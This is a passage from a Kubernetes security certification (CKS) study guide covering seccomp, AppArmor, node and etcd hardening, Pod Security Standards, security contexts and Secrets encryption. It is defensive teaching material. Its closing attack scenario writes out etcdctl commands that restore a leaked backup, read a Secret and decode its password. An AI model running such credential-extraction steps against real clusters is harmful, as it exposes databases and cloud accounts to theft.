   replace kernel ───────────────→    kexec_load()← BLOCKED by Seccomp ✋
   load malware ─────────────────→    create_module()← BLOCKED by Seccomp ✋
   
   ═══════════════════════════════    ═══════════════════════════════════
   🔵 BRIDGE = SYSTEM CALL INTERFACE   🛡️ GATE = SECCOMP FILTER
   ═══════════════════════════════    ═══════════════════════════════════
   
   Every container process MUST cross     Seccomp checks the syscall name
   this bridge to talk to the kernel.     BEFORE the kernel executes it.
   
   Without Seccomp: 🔓 Bridge has NO gates — 300+ syscalls pass freely
   With RuntimeDefault: 🛡️ 240+ gates are LOCKED — only ~60 needed pass

15.2 Seccomp Profiles — RuntimeDefault, Custom, Unconfined

RuntimeDefault — Container Runtime's Built-in Filter

The container runtime (containerd or CRI-O) ships with a default seccomp profile that blocks ~240 of ~300 Linux syscalls. This profile is designed to allow the ~60 syscalls that most applications need (read, write, socket, connect, etc.) while blocking dangerous ones (ptrace, mount, kexec). RuntimeDefault is the recommended profile for ALL production workloads — it provides massive security benefit with zero configuration.

Custom (Localhost) — JSON-Defined Syscall Rules

Custom profiles give you precise control: define exactly which syscalls are allowed (whitelist) or denied (blacklist), and what action to take (allow, deny with error, or kill the process). Profiles are stored as JSON files at /var/lib/kubelet/seccomp/ on each node and referenced by name in the pod spec.

Unconfined — No Seccomp Filter (Insecure Default)

In unconfined mode, no seccomp filter is applied — all 300+ syscalls are available. This was the default in older Kubernetes versions and is still the default if you don't explicitly set seccompProfile. Always explicitly set RuntimeDefault — never rely on the default.

Profile TypeWhat It DoesWhen to UseSecurity Level
RuntimeDefaultUses the container runtime's built-in seccomp profile (containerd/CRI-O). Blocks ~240 of ~300 syscalls.All production workloads — safest default✅ Recommended
Localhost (Custom)JSON file at /var/lib/kubelet/seccomp/ defining exact allowed/denied syscalls with specific actions.When you need finer control than RuntimeDefault✅ Advanced
UnconfinedNo seccomp filter. ALL 300+ syscalls available. This is the INSECURE default on older clusters.Never in production — only for debugging❌ Insecure

Custom Seccomp Profile — JSON Format

/var/lib/kubelet/seccomp/anihpj-seccomp.json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "open", "close", "stat", "fstat",
        "mmap", "mprotect", "munmap", "brk",
        "rt_sigaction", "rt_sigreturn", "exit", "exit_group",
        "getpid", "getppid", "futex", "nanosleep",
        "socket", "connect", "bind", "listen", "accept",
        "getsockname", "getpeername", "setsockopt",
        "clone", "execve", "wait4", "kill"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
💡 defaultAction: SCMP_ACT_ERRNO

This means: "If a syscall is NOT in this list, return an error (EPERM)." The alternative is SCMP_ACT_KILL which kills the process immediately. ERRNO is more graceful — the app gets an error code and can handle it (or crash with a meaningful error). KILL is more aggressive but leaves no room for graceful handling.

15.3 Applying Seccomp in Kubernetes Pod Specs

Seccomp is applied via the pod's securityContext.seccompProfile field. RuntimeDefault is a one-liner that instantly blocks 240+ syscalls.

🔴 INSECURE — No Seccomp (Unconfined)
❌ All 300+ syscalls available
spec:
  containers:
  - name: anihpj
    image: anihpj:v1
    # No seccompProfile specified
    # → Defaults to Unconfined
    # → Attacker can call ANY syscall!
✅ SECURE — RuntimeDefault Seccomp
✅ Only ~60 needed syscalls
spec:
  containers:
  - name: anihpj
    image: anihpj:v1
    securityContext:
      seccompProfile:
        type: RuntimeDefault
    # → 240+ dangerous syscalls BLOCKED
    # → One line = massive security gain
Custom profile: Pod spec + deploying the JSON file
# Step 1: Copy profile to ALL nodes
# scp anihpj-seccomp.json node01:/var/lib/kubelet/seccomp/

# Step 2: Reference custom profile in pod spec
spec:
  containers:
  - name: anihpj
    image: anihpj:v1
    securityContext:
      seccompProfile:
        type: Localhost
        localhostProfile: anihpj-seccomp.json

15.4 AppArmor vs Seccomp — Know the Difference (CKS Exam Critical)

This is the #1 most confused topic on the CKS exam. AppArmor and Seccomp both protect containers, but at completely different levels. Mixing them up will cost you points.

AppArmor — Controls File, Network, and Capability Access

AppArmor operates at the application behavior level. It answers questions like: "Can Django read /etc/shadow?" "Can Django connect to port 5432?" "Can Django use CAP_SYS_ADMIN?" AppArmor profiles are written as path-based rules and are loaded from the node filesystem (/etc/apparmor.d/).

Seccomp — Filters Linux System Calls (Syscalls)

Seccomp operates at the kernel interface level. It answers questions like: "Can Django call ptrace()?" "Can Django call mount()?" "Can Django call kexec_load()?" Seccomp profiles are JSON files listing allowed/denied syscalls and are loaded from /var/lib/kubelet/seccomp/.

Dangerous Syscalls Blocked by RuntimeDefault

The RuntimeDefault profile blocks these dangerous syscalls by default. On the CKS exam, you should recognize which syscalls are dangerous and which profile (AppArmor vs Seccomp) blocks them:

Feature🛡️ AppArmor🚫 Seccomp
ControlsFile paths, network access, Linux capabilitiesLinux system calls (syscalls)
LevelApplication behavior — "can Django read /etc/shadow?"Kernel interface — "can Django call ptrace()?"
Config locationNode filesystem (/etc/apparmor.d/) + pod annotation or securityContextNode filesystem (/var/lib/kubelet/seccomp/) + pod securityContext
Profile formatAppArmor profile syntax (path-based rules)JSON file (syscall name arrays)
DistributionUbuntu/Debian native (needs apparmor package on others)All Linux distributions (kernel feature since 2.6.12)
Complain mode✅ Yes — logs without blocking (great for profile dev)Limited — no direct complain mode equivalent
CKS examMust know: profile syntax, annotation + securityContext methodsMust know: RuntimeDefault, custom JSON, pod spec field
⚠️ CKS Exam — The Most Common Mistake

Exam question: "A pod needs to be restricted from reading /etc/shadow. Should you use AppArmor or Seccomp?" → AppArmor (it controls file paths). "A pod should not be able to use the ptrace syscall. AppArmor or Seccomp?" → Seccomp (it filters syscalls). The exam WILL test your ability to choose the right tool. Remember: AppArmor = what files/paths/caps, Seccomp = what syscalls.

✅ The Best Practice — Use BOTH

For maximum container security, use AppArmor AND Seccomp together. They protect at different layers and complement each other perfectly. AppArmor ensures Django can only read /app/ and write to /app/media/. Seccomp ensures Django can only call the ~50 syscalls it actually needs. An attacker must bypass BOTH to do real damage — and that's exponentially harder than bypassing either one alone.

Chapter 16: Open Ports, Packages & IAM Minimization

The final layer of system hardening: minimizing everything that isn't strictly required. Remove all non-Kubernetes packages, close all non-Kubernetes ports, restrict cloud IAM permissions to the absolute minimum, and lock down etcd access. This chapter is your production-ready hardening checklist.

16.1 Minimizing the Node Attack Surface — The Full Checklist

Before your cluster goes to production, run through this comprehensive node security audit. Every "yes" answer is a potential vulnerability that needs to be addressed.

📋 Pre-Production Node Security Audit Checklist
📦 Packages
  • □ Remove all non-K8s packages (apache, vsftpd, cups, avahi)
  • □ Remove old Docker if using containerd (1.24+)
  • □ Remove build tools (gcc, make) from production nodes
  • □ Remove snapd and other package managers
🔌 Ports
  • □ Close all ports not required by K8s components
  • □ Firewall: 6443 from admin IPs, 10250 from CP only
  • □ Firewall: 2379-2380 from etcd peers only
  • □ Verify with ss -tlnp — only K8s ports listening
👤 Users
  • □ Remove all non-admin user accounts from nodes
  • □ Create dedicated admin accounts (no shared root)
  • □ Restrict sudo to only necessary users
  • □ Remove stale SSH keys for departed team members
☁️ IAM
  • □ Nodes: minimal IAM roles (S3 read-only, no admin)
  • □ Never store cloud credentials on node filesystem
  • □ Use IRSA (AWS) / Workload Identity (GCP) for pod-level IAM
  • □ Rotate cloud credentials regularly

🔍 Before vs After — A Node Hardening Transformation

A K8s Node Before and After System Hardening
   🔴 BEFORE HARDENING                    ✅ AFTER HARDENING
   ──────────────────────                 ────────────────────
   
   Services: 45 running                   Services: 8 running
   → apache2, vsftpd, cups,              → kubelet, containerd,
     avahi, snapd, docker                  sshd, journald only
   
   Open Ports: 12                         Open Ports: 4
   → 22, 80, 443, 8080,                  → 22, 6443, 10250 (CP),
     10255, 2379, 30000+                   179 (BGP only)
   
   SSH: root login allowed                SSH: root login disabled
   → Password auth enabled                → Key-only auth
   → 5 sudo users (2 ex-employees)        → 1 dedicated admin user
   
   Packages: 1,847 installed              Packages: 412 installed
   → gcc, make, build tools               → Only K8s-essentials
   
   Cloud IAM: AdministratorAccess         Cloud IAM: S3 read-only
   → Can read/write ALL S3                → Pods use IRSA per-app
   
   🟠 Attack Surface: LARGE              ✅ Attack Surface: MINIMAL

16.2 Cloud IAM for Kubernetes Nodes

Cloud provider IAM roles control what your nodes can do in the cloud — read S3 buckets, pull container images, write logs. Never give nodes more permissions than absolutely necessary. A compromised node with admin IAM can compromise your entire cloud account.

Cloud ProviderIAM MechanismMinimum Required Permissions
AWSEC2 Instance Profile (IAM Role attached to node)ecr:GetAuthorizationToken, ecr:BatchGetImage, s3:GetObject (for backups only)
GCPGKE Node Service Account with minimal scopesstorage-ro (read images), logging-write, monitoring-write
AzureAKS Managed Identity with minimal rolesAcrPull (pull images), Storage Blob Data Reader (for backups)
🔴 NEVER: Admin-Level Credentials on Nodes

The Capital One breach (2019) happened because an EC2 node had an overly permissive IAM role that could list and read S3 buckets. An SSRF vulnerability in a web app allowed the attacker to reach the EC2 metadata service, steal those credentials, and download 106 million customer records. Lesson: Node IAM roles should be the MOST restrictive in your cloud environment. Use pod-level identity (IRSA, Workload Identity, Azure AD Pod Identity) for application-specific cloud access — never give it to the node itself.

16.3 etcd Security — Restricting Who Can Read the Cluster Brain

etcd stores everything about your cluster — pod specs, ConfigMaps, Secrets (if not encrypted at rest), RBAC rules, and service definitions. Anyone who can reach etcd can read or modify your entire cluster state. etcd must be the most tightly guarded component.

etcd Security — The Three-Layer Defense
🔥LAYER 1: Firewall
🚫Port 2379: API server onlyNo other IP can reach etcd
🚫Port 2380: etcd peers onlyOnly other etcd members
🔒LAYER 2: TLS
✅Client certs requiredAPI server presents cert to etcd
✅Peer certs between membersEncrypted etcd cluster traffic
🔐LAYER 3: Encryption
🔑Encryption at restSecrets unreadable even if etcd accessed
🔑etcd auth (optional)Username/password for etcd itself
API Server: etcd TLS configuration flags
spec:
  containers:
  - command:
    - kube-apiserver
    # etcd TLS — encrypts ALL API server ↔ etcd traffic
    - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt
    - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key
    - --etcd-cafile=/etc/kubernetes/pki/etcd-ca.crt
    - --etcd-servers=https://127.0.0.1:2379
    # Encryption at rest — Secrets encrypted in etcd
    - --encryption-provider-config=/etc/kubernetes/encryption-config.yaml
⚠️ etcd Security — Non-Negotiable Requirements
  • NEVER expose etcd (2379) to the internet or even the wider cluster network. Only the API server should ever connect to etcd.
  • ALWAYS use TLS between the API server and etcd. Without TLS, etcd traffic (including Secrets) travels in plaintext.
  • ALWAYS enable encryption at rest for Secrets in etcd. Even with TLS, if someone gets filesystem access to the etcd data directory, unencrypted Secrets are readable.
  • Consider etcd authentication for defense in depth — a username/password that the API server must provide before etcd accepts any requests.

🗄️ What Happens If etcd Is Compromised — The Ultimate Breach

etcd is the single most valuable target in a Kubernetes cluster. Understanding the blast radius of an etcd compromise explains why every layer of defense matters:

If an Attacker Reaches etcd — The Blast Radius
   🗄️  etcd — THE CLUSTER BRAIN
   ─────────────────────────────────────────────────
   
   📋 WHAT etcd STORES:
   ┌─────────────────────────────────────────────────┐
   │ • All Pod specs (every container, every image)   │
   │ • All Secrets (DB passwords, API keys, TLS keys) │
   │ • All ConfigMaps (app configuration)             │
   │ • All RBAC rules (who can do what)               │
   │ • All Service definitions (network topology)     │
   │ • All Deployment states (what should be running) │
   │ • All Namespace definitions                      │
   │ • ALL CLUSTER STATE — everything                 │
   └─────────────────────────────────────────────────┘
   
   🔴 IF AN ATTACKER READS etcd:
   → Reads all Secrets → all DB passwords, cloud keys
   → Reads all Pod specs → knows exactly what's running
   → Reads all RBAC rules → knows who has admin access
   → Maps the ENTIRE cluster architecture
   
   🔴 IF AN ATTACKER WRITES TO etcd:
   → Creates new admin RBAC bindings → persistent backdoor
   → Modifies Pod specs → injects malicious containers
   → Deletes Deployments → takes down services
   → Changes NetworkPolicies → opens firewall holes
   → The attacker OWNS the cluster permanently
   
   🛡️  THE FIX — Defense in Depth:
   Layer 1: Firewall → Only API server can reach port 2379
   Layer 2: TLS → All etcd traffic encrypted
   Layer 3: Encryption at rest → Secrets encrypted on disk
   Layer 4: Audit logging → Every etcd access recorded
   Layer 5: etcd auth → Username/password for etcd itself

📝 Chapter 16 — CKS Practice Questions

Q1
What ports must remain open on a Kubernetes worker node for the cluster to function? List them with their purposes.
Show Answer
Answer
PortComponentRequired?
10250Kubelet API✅ Yes (control plane → node)
30000-32767NodePort Services⚠️ Only if NodePort used
10256kube-proxy health⚠️ Internal only
10255Kubelet read-only❌ SHOULD BE 0 (disabled)
Explanation

ALL other ports should be firewalled. Port 10250 is the most critical — it's the kubelet API. Restrict it to control plane IPs only. Port 10255 (read-only kubelet) should be disabled entirely: readOnlyPort: 0 in kubelet config.

Q2
What is the principle of least privilege as applied to cloud IAM roles for Kubernetes nodes? Give an AWS example.
Show Answer
Answer

Nodes should have IAM roles with ONLY the permissions needed: ECR pull (for container images), CloudWatch logs (for logging), and KMS decrypt (for secrets). NEVER attach AdministratorAccess to node roles. Example AWS policy: allow ecr:GetAuthorizationToken, ecr:BatchGetImage, logs:PutLogEvents — nothing more.

Explanation

If a container escapes and the node has admin IAM, the attacker has admin cloud access. This is the Capital One breach pattern. Node IAM roles are the cloud-level equivalent of ServiceAccounts — apply least privilege religiously.

Q3
How do you restrict etcd access to only the API server? Write the firewall rules.
Show Answer
Answer
# etcd listens on 2379 (client) and 2380 (peer)
ufw allow from 127.0.0.1 to any port 2379
ufw allow from <control-plane-ip> to any port 2380
ufw deny 2379  # block all other sources
Explanation

etcd contains ALL cluster state — Secrets, ConfigMaps, RBAC, everything. Only the API server should talk to it (via localhost). Block etcd ports from ALL other sources. If etcd is on a separate node, use mTLS + firewall to restrict to API server IPs only.

Q4
Create a complete node hardening script for the anihpj production nodes covering: services, packages, ports, SSH, kernel.
Show Answer
Answer
#!/bin/bash
# Services — remove unnecessary
systemctl stop cups bluetooth avahi-daemon
systemctl disable cups bluetooth avahi-daemon

# Packages — remove unnecessary
apt remove --purge telnetd nfs-kernel-server samba -y

# SSH hardening
sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd

# Firewall — close unnecessary
ufw default deny incoming
ufw allow 6443/tcp  # API server
ufw allow 10250/tcp from <control-plane>
ufw allow 22/tcp
ufw enable

# Kernel
sysctl -w kernel.panic=10

echo "Node hardening complete"
Explanation

This script covers all CKS Domain 3 requirements. Test it on a staging node first. Always backup config files before modifying: cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak. Have a rollback plan for each change.

Q5
What is the difference between ufw and iptables? Which should you use on the CKS exam for firewall rules?
Show Answer
Answer

ufw is a user-friendly frontend for iptables. Use ufw on Ubuntu/Debian: ufw allow 6443. Use firewall-cmd on RHEL/CentOS: firewall-cmd --add-port=6443/tcp --permanent. Both manage iptables underneath. CKS exam: use whichever the node OS supports. Check with which ufw or which firewall-cmd.

Explanation

Don't waste time learning iptables syntax for CKS — ufw and firewall-cmd are sufficient. The exam tests whether you know to restrict ports, not the specific firewall tool. ss -tlnp verifies the result regardless of firewall tool used.

🟡 Part 5: Minimize Microservice VulnerabilitiesChapters 17-22

Chapter 17: Pod Security Standards (PSS) — Admission-Level Enforcement

Pod Security Standards (PSS) replaced PodSecurityPolicy in Kubernetes 1.25. PSS defines three security levels — Privileged, Baseline, Restricted — that are applied at the namespace level via labels. Any pod that violates the namespace's PSS level is blocked at admission time. This is your first line of defense at the cluster boundary.

🟡 Intermediate⏱️ ~1.5 hours🔧 Hands-On🎯 PSS

🎯 What You'll Learn

  • ✅ The three PSS security levels: Privileged, Baseline, Restricted
  • ✅ The three enforcement modes: enforce (block), audit (log), warn (UI)
  • ✅ How to apply PSS labels to namespaces and test compliance
  • ✅ How to choose the right PSS level for each anihpj namespace
🎓 CKS Relevance
Minimize Microservice Vulns 20%

17.1 What Are Pod Security Standards (PSS)?

PSS defines three security levels that control what a pod specification is allowed to include. Each level builds on the previous one — Restricted includes all Baseline restrictions plus additional requirements.

The Three PSS Levels — From Most Permissive to Most Secure
🔓PRIVILEGEDMost Permissive
⚠️No restrictionsFull host access allowed
⚠️Use for: CNI, monitoring daemonsNEVER for user workloads!
🔐BASELINEMedium
🚫Disables: hostNetwork, hostPID, hostIPCPrevents known privilege escalations
🚫Disables: privileged containersNo full host access
🔒RESTRICTEDMost Secure
✅All Baseline + runAsNonRoot: trueMust run as non-root user
✅seccompProfile: RuntimeDefaultSyscall filtering enforced
✅capabilities: drop ALLNo Linux capabilities
📖 PSS vs PSP — Why the Change Matters

PodSecurityPolicy (PSP) was complex, confusing, and required creating ClusterRole-style policies. PSS is dramatically simpler: you just add labels to namespaces. pod-security.kubernetes.io/enforce: restricted — that's it. No ClusterRoles, no policy objects, no complex RBAC. This simplicity is why PSS replaced PSP in Kubernetes 1.25.

The Three Enforcement Modes — enforce, audit, warn

ModeBehaviorWhen to Use
enforcePod creation is BLOCKED if it violates the policyProduction namespaces — prevents bad pods from ever being created
auditViolations are logged to the audit log, but pod IS allowedTesting/migration — see what would break before enforcing
warnViolations trigger a warning message to the user, but pod IS allowedEducating developers — "this pod won't work in production"
💡 Best Practice: Staggered Rollout

When introducing PSS to an existing namespace: start with warn=restricted (users see warnings), then add audit=restricted (logs capture violations), finally enforce with enforce=restricted. This gives teams time to fix their pod specs before enforcement blocks their deployments.

🏛️ The Museum Analogy — Understanding PSS Levels

Three Security Zones in a Museum — Just Like PSS Levels
   🏛️ MUSEUM SECURITY ZONES              ☸️ KUBERNETES PSS LEVELS
   ────────────────────────              ────────────────────────
   
   🔓 PUBLIC LOBBY                       🔓 PRIVILEGED
   → Anyone can enter                    → System pods (CNI, monitoring)
   → No ticket needed                    → Full host access allowed
   → Only for museum staff               → NEVER for user workloads!
   
   🔐 TICKETED GALLERY                   🔐 BASELINE
   → Need a ticket (some control)        → Blocks known exploits
   → Can look, can't touch               → Disables hostNetwork, hostPID
   → Standard visitor access             → Good for dev environments
   
   🔒 HIGH-SECURITY VAULT                🔒 RESTRICTED
   → Need special clearance              → Non-root, no capabilities
   → Everything monitored                → seccomp enforced
   → Nothing leaves without audit        → readOnlyRootFS required
   → For: priceless artifacts (user data) → For: production workloads
   
   💡 PSS is the museum's security policy applied to NAMESPACES.
      Each namespace gets ONE of these three levels.

17.2 Applying PSS to Namespaces

PSS is applied via namespace labels. Three labels control the three modes. You can mix modes — for example, enforce Baseline but warn on Restricted violations.

Namespace with PSS Restricted enforcement
apiVersion: v1
kind: Namespace
metadata:
  name: anihpj-prod
  labels:
    # Enforce Restricted — block non-compliant pods
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    
    # Audit Restricted — log violations
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: latest
    
    # Warn Restricted — show warning to user
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: latest

Testing PSS — Does Your Pod Pass?

Terminal: Test pod compliance
# Label an existing namespace (or create new)
kubectl label ns anihpj-prod pod-security.kubernetes.io/enforce=restricted

# Try to create a non-compliant pod (will be REJECTED)
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata: {name: test-root, namespace: anihpj-prod}
spec:
  containers:
  - name: nginx
    image: nginx:latest
    # Missing: runAsNonRoot, seccompProfile, drop ALL capabilities
    # → REJECTED by PSS Restricted!
EOF
# Error: "pods 'test-root' is forbidden: violates PodSecurity 'restricted:latest'"

# Create a compliant pod (will be ACCEPTED)
kubectl apply -f anihpj-hardened-pod.yaml  # ✅ Accepted

17.3 PSS for the anihpj Namespace

Different namespaces need different PSS levels. Production gets Restricted, development gets Baseline, and system namespaces need Privileged for CNI plugins and node daemons.

🧭 PSS Selection Flowchart — Which Level for Which Namespace?

Q1: Does this workload NEED host-level access? (hostNetwork, hostPID, privileged?)
YES → PRIVILEGED
Only for kube-system: CNI, node exporters. Ask: is there another way?NO ↓
Q2: Can the workload run as a non-root user? (Does Dockerfile have USER 1000?)
NO → BASELINE
Allows root but blocks known exploits. Use for dev environments.YES ↓
Q3: Can the container run with read-only root filesystem? Can you drop ALL capabilities?
NO → BASELINE + specific caps
Allows writable root FS, specific capabilities onlyYES ↓
Q4: Can you drop ALL Linux capabilities? (Does the app need NET_ADMIN, SYS_ADMIN?)
NO → BASELINE + specific caps allowed
Allow only needed capabilities, nothing moreYES ↓
→ RESTRICTED — Maximum security for this workload! 🎉

Recommended PSS Levels for anihpj Namespaces

NamespacePSS LevelReason
anihpj-prodRESTRICTEDServes public job listings — maximum security required
anihpj-devBASELINEDevelopers need flexibility for debugging and testing
kube-systemPRIVILEGEDCNI plugins, node exporters require host access
anihpj-monitoringBASELINEPrometheus + Grafana are trusted, but don't need host access
anihpj-prod — PSS Restricted Compliant Pod
apiVersion: v1
kind: Pod
metadata:
  name: anihpj-hardened
  namespace: anihpj-prod
spec:
  securityContext:                # Pod-level
    runAsNonRoot: true
    runAsUser: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: django
    image: registry.anihpj.com/anihpj:v2
    securityContext:              # Container-level
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    - name: media
      mountPath: /app/media       # Writable for uploads
    - name: tmp
      mountPath: /tmp             # Django needs /tmp
  volumes:
  - name: media
    persistentVolumeClaim:
      claimName: anihpj-media-pvc
  - name: tmp
    emptyDir: {}
🎯 CKS Exam Quick Tip — PSS Label Syntax

The exam WILL test your ability to label a namespace correctly. The label format is: pod-security.kubernetes.io/<MODE>: <LEVEL>. Three modes × three levels = 9 possible combinations. Memorize: enforce blocks, audit logs, warn notifies. One typo in the label name and your pod won't be blocked — the exam grader will mark it wrong.

Chapter 18: Security Contexts — Locking Down Containers

A SecurityContext is a per-pod or per-container specification that controls how a container runs at the Linux level — its user ID, filesystem permissions, Linux capabilities, and privilege settings. This is where you transform a dangerously permissive default container into a locked-down production workload.

🟡 Intermediate⏱️ ~2 hours🔧 Hands-On🎯 SecurityContext

🎯 What You'll Learn

  • ✅ Every SecurityContext field and what it controls
  • ✅ Why runAsNonRoot is the most important single setting
  • ✅ How Linux capabilities work and why you should drop ALL
  • ✅ Container escape paths and how SecurityContext blocks each one
  • ✅ Complete hardened pod spec for anihpj production deployment
🎓 CKS Relevance
Minimize Microservice Vulns 20%
CKS Exam: SecurityContext Is on EVERY Task

Almost every CKS exam task involves modifying or verifying a SecurityContext. You'll be asked to: set runAsNonRoot, drop capabilities, enable readOnlyRootFilesystem, add seccompProfile, and disable privilegeEscalation. Know these fields cold — they're the difference between a pod that passes PSS Restricted and one that's rejected.

18.1 What Is a Security Context?

A SecurityContext defines the Linux-level security settings for a pod or container. It controls: which user ID the process runs as, whether the filesystem is writable, which Linux capabilities are available, and whether privilege escalation is allowed. There are two levels: pod-level (applies to all containers) and container-level (overrides pod-level for specific containers).

SecurityContext Field Quick Reference

FieldEffectCKS Exam
runAsNonRoot: trueK8s refuses to start if image USER is root (UID 0)Must know
runAsUser: 1000Sets process UID inside containerMust know
runAsGroup: 1000Sets process primary GIDKnow
fsGroup: 1000Volume files owned by GID 1000Know
allowPrivilegeEscalation: falseNo child process can gain root via setuidMust know
readOnlyRootFilesystem: true/ is read-only; writes to / failMust know
capabilities.drop: ["ALL"]Remove all Linux capabilitiesMust know
seccompProfile.type: RuntimeDefaultApply runtime's seccomp filterMust know
privileged: falseNo full host access (default, but set explicitly)Know

18.2 Running as Non-Root — The Most Important Setting

By default, containers run as root (UID 0) inside the container. If the container escapes to the node, the attacker has root on the host — the worst-case scenario. runAsNonRoot: true is the single most impactful security setting you can apply.

Root Container (UID 0) vs Non-Root Container

🔴 ROOT CONTAINER — Escape = Total Compromise
  • Runs as UID 0 (root) inside container
  • Container escape → attacker has root on NODE
  • Can read ALL files on node
  • Can install rootkits + backdoors
  • Can modify system binaries
  • Can access host network interfaces
✅ NON-ROOT CONTAINER — Escape = Limited Access
  • Runs as UID 1000 (unprivileged)
  • Container escape → attacker is UID 1000
  • Can only read files with world permissions
  • Cannot install rootkits (no root)
  • Cannot modify system binaries
  • Very limited host access

runAsNonRoot: true + runAsUser: 1000

Pod spec — non-root user
securityContext:
  runAsNonRoot: true       # Kubernetes REFUSES to start if image's USER is root
  runAsUser: 1000          # Run process as UID 1000 inside container
  runAsGroup: 1000         # Primary group GID 1000

Dockerfile USER Must Match Pod runAsUser

# Dockerfile (must match pod runAsUser: 1000):
RUN groupadd -r anihpj && useradd -r -g anihpj anihpj
USER anihpj           # ← Creates UID 1000 by default
⚠️ Mismatch = Pod Won't Start!

If pod says runAsNonRoot: true but Dockerfile's USER is root (UID 0), Kubernetes refuses to start the pod entirely. If pod says runAsUser: 1000 but Dockerfile USER is different, files have wrong ownership. Always sync: Dockerfile USER = pod runAsUser.

18.3 Linux Capabilities — Dropping What You Don't Need

Linux capabilities split the all-powerful "root" into granular privileges. Default containers get ~14 capabilities — far more than needed. Drop ALL, add back only what's required.

Default Capabilities (~14) vs drop ALL

The Linux kernel defines ~40 capabilities. By default, Docker/containerd grants containers ~14 of them — including potentially dangerous ones. Dropping ALL removes every capability, then you can selectively add back only what's truly needed.

Dangerous Capabilities — CAP_SYS_ADMIN, CAP_NET_ADMIN, CAP_NET_RAW

CapabilityWhat It Allowsanihpj Needs?
CAP_SYS_ADMINMount filesystems, swapon, sethostname — essentially root-level system control❌ NEVER
CAP_NET_ADMINModify firewall rules, network interfaces, routing tables❌ No
CAP_NET_RAWCreate raw sockets — craft custom packets, bypass firewall rules❌ No
CAP_SYS_PTRACETrace any process — read memory of other containers, steal credentials❌ No
CAP_NET_BIND_SERVICEBind to ports < 1024 (privileged ports)❌ Uses port 8000
🔴 CAP_SYS_ADMIN = The "New Root"

CAP_SYS_ADMIN is so powerful that security researchers call it "the new root." It allows mounting filesystems, changing hostnames, loading kernel modules, and dozens of other privileged operations. If an attacker has CAP_SYS_ADMIN inside a container, they can likely escape to the host. Never grant CAP_SYS_ADMIN to a user workload.

anihpj: Zero Capabilities Needed — drop ALL

securityContext:
  capabilities:
    drop: ["ALL"]
    # add: []  ← empty! anihpj Django on port 8000 needs ZERO capabilities

18.4 Privilege Escalation — The allowPrivilegeEscalation Flag

allowPrivilegeEscalation: false prevents child processes from gaining more privileges than their parent — neutralizing setuid binary attacks entirely.

securityContext:
  allowPrivilegeEscalation: false  # No setuid escalation

18.5 Read-Only Root Filesystem — Immutability in Practice

readOnlyRootFilesystem: true makes / read-only. Writable directories must be explicitly mounted. Prevents attackers from writing backdoors to binaries or configs.

securityContext:
  readOnlyRootFilesystem: true    # / is read-only
volumeMounts:                     # Only these are writable:
- {name: media, mountPath: /app/media}
- {name: tmp, mountPath: /tmp}

18.6 Complete Security Context for anihpj — The Hardened Pod

🛡️ Complete Hardened anihpj Pod — Every Security Field Applied
  POD-LEVEL:                          CONTAINER-LEVEL:
  ──────────                          ────────────────
  runAsNonRoot: true                  allowPrivilegeEscalation: false
  runAsUser: 1000                     readOnlyRootFilesystem: true
  runAsGroup: 1000                    capabilities.drop: ["ALL"]
  fsGroup: 1000                       appArmorProfile:
  seccompProfile:                       type: Localhost
    type: RuntimeDefault                 localhostProfile: anihpj-django
  
  ✅ This pod passes PSS Restricted enforcement
  ✅ 6 container escape paths: ALL blocked
  ✅ Zero capabilities, non-root, immutable FS

🛡️ Container Escape Defense Tree — 6 Paths, All Blocked

Every Escape Path Blocked by ≥ 2 Layers
  PATH 1: Kernel exploit        → 🛡️ Seccomp + gVisor
  PATH 2: Mount host FS         → 🛡️ drop ALL + privileged:false
  PATH 3: Sniff host network    → 🛡️ hostNetwork:false + drop ALL
  PATH 4: Write malicious binary → 🛡️ readOnlyRootFS + AppArmor
  PATH 5: setuid escalation     → 🛡️ allowPrivEsc:false + runAsNonRoot
  PATH 6: Access docker.sock    → 🛡️ PSS Restricted + never mount it
  
  🏁 Defense in depth: even if one layer fails, another stops the attack.

Chapter 19: Secrets Management — Encryption at Rest

Kubernetes Secrets are base64-encoded, NOT encrypted. Anyone who can access etcd — or has RBAC permissions to read Secrets — can decode and read them in plaintext. Encryption at rest ensures that even if etcd is compromised, Secrets remain unreadable without the encryption key.

🟡 Intermediate⏱️ ~1 hour🔧 Hands-On🎯 Secrets

🎯 What You'll Learn

  • ✅ Why base64 ≠ encryption — the critical distinction
  • ✅ How to configure EncryptionConfiguration for Secrets
  • ✅ Available encryption providers: aescbc, aesgcm, secretbox, kms
  • ✅ How to rotate existing Secrets after enabling encryption
🎓 CKS Relevance
Minimize Microservice Vulns 20%

19.1 The Problem: Secrets in etcd Are Plaintext by Default

When you create a Kubernetes Secret, the data is base64-encoded — not encrypted. Base64 is a reversible encoding, like writing a note in a simple substitution cipher. Anyone with access can decode it instantly.

⚠️ Real-World Scenario: The Unencrypted etcd Backup

How an Attacker Exploits Unencrypted Secrets — Step by Step
  🗄️ THE SCENARIO: anihpj runs on Kubernetes. Secrets are NOT encrypted at rest.
  
  Step 1: An attacker gains access to an etcd backup file
          (misconfigured S3 bucket, leaked backup, insider threat)
  
  Step 2: Attacker extracts the backup:
          etcdctl snapshot restore backup.db --data-dir /tmp/etcd
  
  Step 3: Attacker queries etcd for Secrets:
          ETCDCTL_API=3 etcdctl get /registry/secrets/anihpj-prod/db-creds
  
  Step 4: WITHOUT encryption:
          → Secret values are PLAINTEXT (just base64-encoded)
          → echo "cGFzc3dvcmQ=" | base64 -d → "password" 🔴
  
  Step 5: Attacker now has:
          ✅ Database password → full DB dump
          ✅ Django SECRET_KEY → session hijacking
          ✅ API keys → cloud resource access
